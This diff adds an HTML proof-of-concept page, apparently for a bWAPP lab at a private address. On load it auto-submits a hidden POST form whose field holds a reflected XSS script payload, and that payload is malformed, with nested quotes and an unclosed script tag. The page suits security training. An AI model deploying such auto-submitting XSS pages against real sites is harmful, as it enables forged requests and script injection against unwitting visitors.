@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>Reflected POST XSS</title>
+</head>
+
+<body onload="document.myform.submit()">
+	<form action="http://10.0.2.4/bWAPP/xss_post.php" method="POST" name="myform">
+		<input type="hidden" name="firstname" value="<script>alert("Udao siem!");<script>">
+		<input type="hidden" name="lastname" value="XSS">
+	</form>
+</body>
+
+</html>
